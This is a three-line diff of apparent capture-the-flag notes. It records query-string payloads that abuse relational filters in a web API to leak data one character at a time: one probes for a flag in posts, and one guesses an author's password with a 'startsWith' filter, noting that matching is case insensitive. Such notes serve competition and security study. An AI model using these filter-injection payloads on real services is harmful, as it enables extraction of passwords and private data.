@@ -1,0 +1,3 @@
+/api/posts?AND[author][posts][some][body][contains]=uoftctf{flag}{i}&AND[author][posts][some]
+/api/posts?author[password][startsWith]=CHAR
+^^ case insensitive
